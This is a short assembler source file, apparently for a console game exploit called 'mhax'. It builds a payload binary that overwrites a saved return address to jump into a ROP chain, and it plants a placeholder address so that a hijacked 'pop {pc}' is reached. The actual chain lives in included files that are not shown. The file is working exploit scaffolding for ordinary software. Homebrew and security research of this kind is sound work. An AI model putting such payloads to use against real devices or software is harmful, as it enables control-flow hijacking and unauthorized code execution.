.nds

.include "mhax_constants.s"

.create "payload.bin",MCOPY_PAYLOAD_BUFFER_PTR

.loadtable "unicode.tbl"

.include "mhax_macros.s"

.orga 0x12c
	jump_sp rop

; needs to be a valid address - local variable used before we hit the pop {pc} we hijack
.orga 0x1a4
	.word 0x08000000

.orga 0x200
	.include "mhax_rop.s"

.Close
